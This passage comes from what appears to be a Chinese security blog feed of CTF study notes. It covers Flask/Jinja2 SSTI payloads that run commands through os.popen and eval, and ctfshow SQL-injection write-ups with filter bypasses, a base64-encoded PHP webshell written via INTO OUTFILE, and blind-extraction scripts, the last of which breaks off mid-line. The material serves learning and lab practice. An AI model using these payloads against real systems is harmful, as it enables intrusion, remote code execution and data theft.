class="line">`__getattribute__()   绕过关键字。实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。`</span><br><span class="line">`__getitem__()        绕过[]。调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)`</span><br><span class="line">`__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]`</span><br><span class="line"></span><br><span class="line">`__builtins__         内建名称空间，里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。`</span><br><span class="line">`url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。`</span><br><span class="line">`get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。`</span><br><span class="line">`lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;`</span><br><span class="line"></span><br><span class="line">`request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()`</span><br><span class="line">`request.args.x1    get传参`</span><br><span class="line">`request.values.x1  所有参数`</span><br><span class="line">`request.cookies      cookies参数`</span><br><span class="line">`request.headers      请求头参数`</span><br><span class="line">`request.form.x1    post传参(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)`</span><br><span class="line">`request.data   post传参(Content-Type:a/b)`</span><br><span class="line">`request.json post传json  (Content-Type: application/json)`</span><br><span class="line"></span><br><span class="line">`config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;`</span><br><span class="line">`current_app          应用上下文，一个全局变量。`</span><br><span class="line">`g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#x27;flask_ssti&#x27;&gt;`  </span><br></pre></td></tr></table></figure><p>​    (真的多)</p><h5 id="常见的命令执行方式："><a href="#常见的命令执行方式：" class="headerlink" title="常见的命令执行方式："></a>常见的命令执行方式：</h5><h6 id="os-system"><a href="#os-system" class="headerlink" title="os.system():"></a>os.system():</h6><p><code>…init__globals[‘os’].system(‘ls’)</code>的输出是执行结果的返回值，而不是执行命令的输出，成功执行返回0，失败返回-1，因为输出结果不明显，所以我们也会用到下面这个命令：</p><h6 id="os-popen"><a href="#os-popen" class="headerlink" title="os.popen():"></a>os.popen():</h6><p>用法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`os.popen(command[,mode[,bufsize]])`</span><br><span class="line">`eg:&#123;&#123;()class.base.subclass__()[71].init.globlas__[‘os’].popen(‘ls’,‘r’).read()&#125;&#125;`</span><br></pre></td></tr></table></figure><p>说明：mode – 模式权限可以是 ‘r’(默认) 或 ‘w’。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">init.globals__[‘os’].popen(‘ls’,‘r’),read()</span><br></pre></td></tr></table></figure><p>popen方法通过p.read()获取终端输出，而且popen需要关闭close().当执行成功时，close()不返回任何值，失败时，close()返回系统返回值（失败返回1）. 可见它获取返回值的方式和os.system不同。</p><p>缺点：Popen非常强大，支持多种参数和模式，通过其构造函数可以看到支持很多参数。但Popen函数存在缺陷在于，它是一个阻塞的方法，如果运行cmd命令时产生内容非常多，函数就容易阻塞。另一点，Popen方法也不会打印出cmd的执行信息</p><h6 id="warnings-catchwarning"><a href="#warnings-catchwarning" class="headerlink" title="warnings.catchwarning:"></a>warnings.catchwarning:</h6><p>访问os模块还有从warnings.catchwarnings模块入手的，而这两个模块分别位于元组中的59，60号元素。__init__方法用于将对象实例化，在这个函数下我们可以通过funcglobals（或者__globals）看该模块下有哪些globals函数（注意返回的是字典），而linecache可用于读取任意一个文件的某一行，而这个函数引用了os模块。</p><p>例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;].system(&#x27;ls&#x27;)`</span><br><span class="line"></span><br><span class="line">`[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__.values()[12].system(&#x27;ls&#x27;)`</span><br></pre></td></tr></table></figure><h6 id="builtins-内建函数"><a href="#builtins-内建函数" class="headerlink" title="__builtins__内建函数:"></a>__builtins__内建函数:</h6><p>内建函数就是本身就有的，启动的时候python解释器就会自动解析，内建函数里面包括了许多们需要的eval函数，可以执行命令</p><p>例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;)`</span><br><span class="line"></span><br><span class="line">`&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;)`</span><br><span class="line"></span><br><span class="line">`这两个payload用的是同一个模块,__builtins__模块,eval方法.`</span><br><span class="line"></span><br><span class="line">`[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__.values()[12].popen(&#x27;ls&#x27;).read()`</span><br></pre></td></tr></table></figure><h5 id="绕过"><a href="#绕过" class="headerlink" title="绕过:"></a>绕过:</h5><h6 id="拼接："><a href="#拼接：" class="headerlink" title="拼接："></a>拼接：</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`object.__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;ls&#x27;)`</span><br><span class="line"></span><br><span class="line">`().__class__.__bases__[0].__subclasses__()[40](&#x27;r&#x27;,&#x27;fla&#x27;+&#x27;g.txt&#x27;)).read()`</span><br></pre></td></tr></table></figure><h6 id="编码："><a href="#编码：" class="headerlink" title="编码："></a>编码：</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)`</span><br></pre></td></tr></table></figure><p><code>等价于</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;ZXZhbA==&#x27;.decode(&#x27;base64&#x27;)](&quot;X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=&quot;.decode(&#x27;base64&#x27;))(可以看出单双引号内的都可以编码)`</span><br></pre></td></tr></table></figure><p><code>同理还可以进行rot13、16进制编码等</code></p><h6 id="过滤中括号-："><a href="#过滤中括号-：" class="headerlink" title="过滤中括号[]："></a>过滤中括号[]：</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`getitem()`</span><br><span class="line"></span><br><span class="line">`&quot;&quot;.__class__.__mro__[2]`</span><br><span class="line">`&quot;&quot;.__class__.__mro__.__getitem__(2)`</span><br><span class="line"></span><br><span class="line">`pop()`</span><br><span class="line"></span><br><span class="line">`&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()`</span><br></pre></td></tr></table></figure><p><code>字典读取</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`__builtins__[&#x27;eval&#x27;]()`</span><br><span class="line">`__builtins__.eval()`</span><br></pre></td></tr></table></figure><p><code>经过测试这种方法在python解释器里不能执行，但是在测试的题目环境下可以执行</code></p><h6 id="过滤引号："><a href="#过滤引号：" class="headerlink" title="过滤引号："></a>过滤引号：</h6><p><code>先获取chr函数，赋值给chr，后面拼接字符串</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`&#123;% set`</span><br><span class="line">`chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr`</span><br><span class="line">`%&#125;&#123;&#123;`</span><br><span class="line">`().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()`</span><br><span class="line">`&#125;&#125;`</span><br><span class="line"></span><br><span class="line">`或者借助request对象：（这种方法在沙盒种不行，在web下才行，因为需要传参）`</span><br><span class="line"></span><br><span class="line">`&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd`</span><br><span class="line"></span><br><span class="line">`PS：将其中的request.args改为request.values则利用post的方式进行传参`</span><br><span class="line"></span><br><span class="line">`执行命令：`</span><br><span class="line"></span><br><span class="line">`&#123;% set`</span><br><span class="line">`chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr`</span><br><span class="line">`%&#125;&#123;&#123;`</span><br><span class="line">`().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read()`</span><br><span class="line">`&#125;&#125;`</span><br><span class="line"></span><br><span class="line">`&#123;&#123;`</span><br><span class="line">`().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read()`</span><br><span class="line">`&#125;&#125;&amp;cmd=id`</span><br></pre></td></tr></table></figure><h6 id="过滤双下划线-："><a href="#过滤双下划线-：" class="headerlink" title="过滤双下划线__："></a>过滤双下划线__：</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`&#123;&#123;`</span><br><span class="line">`&#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read()`</span><br><span class="line">`&#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__`</span><br></pre></td></tr></table></figure><h6 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h6>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>show_sql注入上</title>
      <link href="/2025/03/25/show-sql%E6%B3%A8%E5%85%A5%E4%B8%8A/"/>
      <url>/2025/03/25/show-sql%E6%B3%A8%E5%85%A5%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<h3 id="show-sql注入："><a href="#show-sql注入：" class="headerlink" title="show_sql注入："></a>show_sql注入：</h3><h4 id="171："><a href="#171：" class="headerlink" title="171："></a>171：</h4><p>这个是考察万能密码的直接：’ or 1&#x3D;1–+就直接出来了</p><p>这里说一下sql的基本查看语句：一般来说正常的是：</p><p>SELECT * FROM users WHERE username &#x3D; ‘$input’ AND password &#x3D; ‘$password’;</p><p>然后你注入万能密码就成为了：</p><p>SELECT * FROM users WHERE username &#x3D; ‘’ or 1&#x3D;1–+ AND password &#x3D; ‘$password’;(–+表示注释，即注释之后的都不执行)</p><p>这样原本的查询条件就被破坏，<code>or 1=1</code> 使得整个 <code>WHERE</code> 条件恒为真，并且 <code>--</code> 注释掉了后面的 <code>AND password = &#39;$password&#39;</code> 部分，最终可能导致攻击者绕过认证机制，获取到数据库中 <code>users</code> 表的所有记录等恶意操作。当然mysql数据库也不一定是’’进行闭合的，具体问题具体分析。</p><h4 id="172"><a href="#172" class="headerlink" title="172:"></a>172:</h4><p>这个也是没有过滤，先试试万能密码：’ or 1&#x3D;1–+成功回显说明是’进行闭合，接下来就可以试试sql的语句了(有俩列数据)：</p><p>‘ union select 1,2–+</p><p>‘ union select 1,database()–+</p><p>‘ union select 1,group_concat(table_name)from information_schema.tables where table_schema&#x3D;’ctfshow_web’–+</p><p>‘ union select 1,group_concat(column_name)from information_schema.columns where table_name&#x3D;’ctfshow_user2’–+</p><p>‘ union select 1,group_concat(password)from ctfshow_user2–+</p><h4 id="173"><a href="#173" class="headerlink" title="173:"></a>173:</h4><p>一样，’ union select 1,2,group_concat(password)from ctfshow_user3–+</p><h4 id="174："><a href="#174：" class="headerlink" title="174："></a>174：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/flag|[0-9]/i</span><br></pre></td></tr></table></figure><p>这个额可以使用replace</p><p>‘ union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),”1”,”@A”),”2”,”@B”),”3”,”@C”),”4”,”@D”),”5”,”@E”),”6”,”@F”),”7”,”@G”),”8”,”@H”),”9”,”@I”),”0”,”@J”),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),”1”,”@A”),”2”,”@B”),”3”,”@C”),”4”,”@D”),”5”,”@E”),”6”,”@F”),”7”,”@G”),”8”,”@H”),”9”,”@I”),”0”,”@J”) from ctfshow_user4 where username&#x3D;”flag” – +</p><p>然后得到：Y@CRmc@Bhvd@CtiNzE@BMjdhOC@JwNTM@ALTQyYzEtOGU@CNC@JzYzliYzU@BOWY@JNzN@I</p><p>然后在pycharm里面进行替换解密：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">flag64 = &quot;Y@CRmc@Bhvd@CtiNzE@BMjdhOC@JwNTM@ALTQyYzEtOGU@CNC@JzYzliYzU@BOWY@JNzN@I&quot;</span><br><span class="line"></span><br><span class="line">flag = flag64.replace(&quot;@A&quot;, &quot;1&quot;).replace(&quot;@B&quot;, &quot;2&quot;).replace(&quot;@C&quot;, &quot;3&quot;).replace(&quot;@D&quot;, &quot;4&quot;).replace(&quot;@E&quot;, &quot;5&quot;).replace(</span><br><span class="line">    &quot;@F&quot;, &quot;6&quot;).replace(&quot;@G&quot;, &quot;7&quot;).replace(&quot;@H&quot;, &quot;8&quot;).replace(&quot;@I&quot;, &quot;9&quot;).replace(&quot;@J&quot;, &quot;0&quot;)</span><br><span class="line"></span><br><span class="line">print(base64.b64decode(flag))</span><br></pre></td></tr></table></figure><p>就出来flag了</p><h4 id="175："><a href="#175：" class="headerlink" title="175："></a>175：</h4><p>这个可以进行写入文件：</p><p>union select 1,group_concat(password) from ctfshow_user5 where username&#x3D;”flag” into outfile “&#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt”</p><p>但是我不知道为什么复现不了；</p><p>或者：传入一句话木马(进行url编码之后再进行base64编码)</p><p>1’ union select 1,from_base64(“%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b”) into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php然后url&#x2F;1.php蚁剑连接就行</p><h4 id="176："><a href="#176：" class="headerlink" title="176："></a>176：</h4><p>‘ or 1&#x3D;1%23万能密码直接出来了；</p><h4 id="177："><a href="#177：" class="headerlink" title="177："></a>177：</h4><p>此处是对空格进行绕过</p><p>空格可以进行：&#x2F;**&#x2F;(注释)，%0a(换行符),%0b(垂直制表符差不多也是换行符),%0c.%09</p><h4 id="178"><a href="#178" class="headerlink" title="178:"></a>178:</h4><p>同上，空格换成%0b|%0c</p><h4 id="179"><a href="#179" class="headerlink" title="179:"></a>179:</h4><p>空格换成%0c</p><h4 id="180"><a href="#180" class="headerlink" title="180:"></a>180:</h4><p>‘or’1’&#x3D;’1’–%0c</p><h4 id="181："><a href="#181：" class="headerlink" title="181："></a>181：</h4><p>‘or’1’&#x3D;’1’–%0c</p><h4 id="182："><a href="#182：" class="headerlink" title="182："></a>182：</h4><p>‘or’1&#x3D;1’–%01</p><p>‘or’1&#x3D;1’–%08</p><p>0c也可以</p><h4 id="183："><a href="#183：" class="headerlink" title="183："></a>183：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;select count(pass) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在csdn上面学到了一些东西：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = &#123;<span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;`ctfshow_user`where`pass`like(&#x27;&#123;&#125;%&#x27;)&quot;</span>.<span class="built_in">format</span>(flag + k)&#125;</span><br></pre></td></tr></table></figure><ul><li>这行代码构造了一个字典 <code>data</code>，用于作为 POST 请求的数据。</li><li><code>tableName</code> 是请求参数名，其值是一个 SQL 语句片段。<code>like(&#39;&#123;&#125;%&#39;)</code> 是 SQL 的模糊匹配操作符，意思是匹配以 <code>flag + k</code> 开头的字符串。注释掉的部分使用了 <code>regexp</code> 正则表达式匹配，功能类似。</li></ul><p>然后空格的话可以使用()绕过或者&#96;&#96;反引号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url = &#x27;http://cd86bba0-571c-482d-a491-5e7e79faadd1.challenge.ctf.show/select-waf.php&#x27;</span><br><span class="line">dic = string.digits+string.ascii_lowercase+&#x27;-&#123;&#125;&#x27;  # flag可能的字符</span><br><span class="line"># print(dic)</span><br><span class="line">out = &#x27;ctfshow&#123;&#x27;  # 已经确定的部分</span><br><span class="line">for j in range(0, 50):  # 为了确保flag完整输出，范围尽量大一点，观察到flag完全输出后结束运行即可</span><br><span class="line">    for k in dic:</span><br><span class="line">        payload = &#123;&#x27;tableName&#x27;: f&quot;(ctfshow_user)where(pass)like&#x27;&#123;out+k&#125;%&#x27;&quot;&#125;  # 将每次更新后的out加上我们新增的一个猜测字符添加到payload</span><br><span class="line">        # print(payload)</span><br><span class="line">        re = requests.post(url, data=payload)</span><br><span class="line">        # print(re.text)</span><br><span class="line">        if &#x27;$user_count = 1;&#x27; in re.text:</span><br><span class="line">            print(k)</span><br><span class="line">            out += k</span><br><span class="line">            break  # 回显1说明我们猜正确了，跳出内层循环，继续猜下一位</span><br><span class="line">    print(out)</span><br></pre></td></tr></table></figure><h4 id="184："><a href="#184：" class="headerlink" title="184："></a>184：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>新过滤了where了，可以使用having</p><p>区别：<code>WHERE</code>是对原始数据行的过滤，<code>HAVING</code>是对分组聚合后的结果进行筛选。在没有<code>GROUP BY</code>子句时，<code>HAVING</code>的行为与<code>WHERE</code>类似，但<code>HAVING</code>支持聚合函数</p><p>一个HAVING子句必须位于GROUP BY子句之后，并位于ORDER BY子句之前</p><p>然后单双引号、反引号都被过滤了，但是本题没有过滤空格,单双引号可以用括号+十六进制。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url = &#x27;http://6244362c-ee43-4012-81d5-275793a9617c.challenge.ctf.show/select-waf.php&#x27;</span><br><span class="line">dic = string.digits+string.ascii_lowercase+&#x27;-&#123;&#125;&#x27;  # flag可能的字符</span><br><span class="line">dic = [f&quot;&#123;ord(c):02x&#125;&quot; for c in dic]</span><br><span class="line"># print(dic)</span><br><span class="line">out = &#x27;0x63746673686f777b&#x27;  # 已经确定的部分</span><br><span class="line">for j in range(0, 50):  # 为了确保flag完整输出，范围尽量大一点，观察到flag完全输出后结束运行即可</span><br><span class="line">    for k in dic:</span><br><span class="line">        payload = &#123;&#x27;tableName&#x27;: f&quot;ctfshow_user group by pass having pass like &#123;out+k&#125;25&quot;&#125;  # 将每次更新后的out加上我们新增的一个猜测字符添加到payload</span><br><span class="line">        # print(payload)</span><br><span class="line">        re = requests.post(url, data=payload)</span><br><span class="line">        # print(re.text)</span><br><span class="line">        if &#x27;$user_count = 1;&#x27; in re.text:</span><br><span class="line">            print(k)</span><br><span class="line">            out += k</span><br><span class="line">            break  # 回显1说明我们猜正确了，跳出内层循环，继续猜下一位</span><br><span class="line">    print(out)</span><br></pre></td></tr></table></figure><h4 id="185："><a href="#185：" class="headerlink" title="185："></a>185：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这个过滤了数字不过，可以使用sql语法：可以使用 true 结合 concat 拼接出数字   例：</p><p>mysql&gt; select concat(true,true);<br>+——————-+<br>| concat(true,true) |<br>+——————-+<br>| 11                |<br>+——————-+<br>1 row in set (0.00 sec)</p><p>附上yu师傅的脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#author:yu22x</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url=&quot;http://8319afbf-281c-4a73-b14e-a29426d0e556.challenge.ctf.show/select-waf.php&quot;</span><br><span class="line">s=&#x27;0123456789abcdef-&#123;&#125;&#x27;</span><br><span class="line">def convert(strs):</span><br><span class="line">  t=&#x27;concat(&#x27;</span><br><span class="line">  for s in strs:</span><br><span class="line">    t+= &#x27;char(true&#x27;+&#x27;+true&#x27;*(ord(s)-1)+&#x27;),&#x27;</span><br><span class="line">  return t[:-1]+&quot;)&quot;</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i in range(1,45):</span><br><span class="line">  print(i)</span><br><span class="line">  for j in s:</span><br><span class="line">    d = convert(f&#x27;^ctfshow&#123;flag+j&#125;&#x27;)</span><br><span class="line">    data=&#123;</span><br><span class="line">    &#x27;tableName&#x27;:f&#x27; ctfshow_user group by pass having pass regexp(&#123;d&#125;)&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    #print(data)</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    #print(r.text)</span><br><span class="line">    if(&quot;user_count = 1&quot;  in r.text):</span><br><span class="line">      flag+=j</span><br><span class="line">      print(flag)</span><br><span class="line">      if j==&#x27;&#125;&#x27;:</span><br><span class="line">        exit(0)</span><br><span class="line">      break</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def convert(strs):</span><br><span class="line">  t=&#x27;concat(&#x27;</span><br><span class="line">  for s in strs:</span><br><span class="line">    t+= &#x27;char(true&#x27;+&#x27;+true&#x27;*(ord(s)-1)+&#x27;),&#x27;</span><br><span class="line">  return t[:-1]+&quot;)&quot;</span><br></pre></td></tr></table></figure><p>这个先将s给转化为ascll码，然后进行true的加和乘，用来回显出来字母</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in range(1,45):</span><br><span class="line">  print(i)</span><br><span class="line">  for j in s:</span><br><span class="line">    d = convert(f&#x27;^ctfshow&#123;flag+j&#125;&#x27;)</span><br><span class="line">    data=&#123;</span><br><span class="line">    &#x27;tableName&#x27;:f&#x27; ctfshow_user group by pass having pass regexp(&#123;d&#125;)&#x27;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个先找出来以ctfshow{开头的字段，然后猜flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(&quot;user_count = 1&quot;  in r.text):</span><br><span class="line">  flag+=j</span><br><span class="line">  print(flag)</span><br><span class="line">  if j==&#x27;&#125;&#x27;:</span><br><span class="line">    exit(0)</span><br><span class="line">  break</span><br></pre></td></tr></table></figure><p>这个用来判断flag。</p><h4 id="186："><a href="#186：" class="headerlink" title="186："></a>186：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>还是yu师傅的脚本</p><h4 id="187："><a href="#187：" class="headerlink" title="187："></a>187：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">  $sql = &quot;select count(*) from ctfshow_user where username = &#x27;$username&#x27; and password= &#x27;$password&#x27;&quot;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$username = $_POST[&#x27;username&#x27;];</span><br><span class="line">$password = md5($_POST[&#x27;password&#x27;],true);</span><br><span class="line"></span><br><span class="line">//只有admin可以获得flag</span><br><span class="line">if($username!=&#x27;admin&#x27;)&#123;</span><br><span class="line">    $ret[&#x27;msg&#x27;]=&#x27;用户名不存在&#x27;;</span><br><span class="line">    die(json_encode($ret));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个是登录页面，</p><p>string md5( string $str[, bool $raw_output &#x3D; false] )</p><ul><li>raw_output：如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</li></ul><p><code>ffifdyop</code>是一个特殊的字符串，类似万能密码。还有129581926211651571912466741651878684928也可以达到同样的效果。</p><p>然后admin ffifdyop 就登录进去了，记得bp抓包</p><h4 id="188："><a href="#188：" class="headerlink" title="188："></a>188：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//用户名检测</span><br><span class="line"> if(preg_match(&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;, $username))&#123;</span><br><span class="line">   $ret[&#x27;msg&#x27;]=&#x27;用户名非法&#x27;;</span><br><span class="line">   die(json_encode($ret));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> //密码检测</span><br><span class="line"> if(!is_numeric($password))&#123;</span><br><span class="line">   $ret[&#x27;msg&#x27;]=&#x27;密码只能为数字&#x27;;</span><br><span class="line">   die(json_encode($ret));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> //密码判断</span><br><span class="line"> if($row[&#x27;pass&#x27;]==intval($password))&#123;</span><br><span class="line">     $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br><span class="line">     array_push($ret[&#x27;data&#x27;], array(&#x27;flag&#x27;=&gt;$flag));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>多了检测;</p><p>sql里，数字和字符串的匹配是弱类型比较，字符串会转换为数字，如0&#x3D;&#x3D;admin，那么如果输入的username是0，则会匹配所有开头不是数字或者为0的字符串和数字0。</p><p>然后再来看password的判断，也是弱类型的比较，那么也直接输入0，尝试登录一个用户名和pass的开头是字母或是0的用户。</p><h4 id="189"><a href="#189" class="headerlink" title="189:"></a>189:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//用户名检测</span><br><span class="line"> if(preg_match(&#x27;/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i&#x27;, $username))&#123;</span><br><span class="line">   $ret[&#x27;msg&#x27;]=&#x27;用户名非法&#x27;;</span><br><span class="line">   die(json_encode($ret));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> //密码检测</span><br><span class="line"> if(!is_numeric($password))&#123;</span><br><span class="line">   $ret[&#x27;msg&#x27;]=&#x27;密码只能为数字&#x27;;</span><br><span class="line">   die(json_encode($ret));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> //密码判断</span><br><span class="line"> if($row[&#x27;pass&#x27;]==$password)&#123;</span><br><span class="line">     $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>然后提示flag在api&#x2F;index.php文件中，这个是要是有load_file的函数</p><p>然后测试：u&#x3D;0&amp;p&#x3D;0时是密码错误说明存在u&#x3D;1这个账号，而u&#x3D;1&amp;p&#x3D;0时，查询失败说明没有这个账号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># @Author:Kradress</span><br><span class="line">from operator import concat</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url = &#x27;http://45b25a84-ef41-400e-ad2f-ae90d1670eaa.challenge.ctf.show/api/index.php&#x27;</span><br><span class="line">uuid = string.digits+string.ascii_lowercase+&quot;-&#125;&quot;</span><br><span class="line">passwd = &quot;if(load_file(&#x27;/var/www/html/api/index.php&#x27;)regexp(&#x27;ctfshow&#123;&quot; #ctfshow&#123;</span><br><span class="line">flag = &#x27;ctfshow&#123;&#x27;</span><br><span class="line"></span><br><span 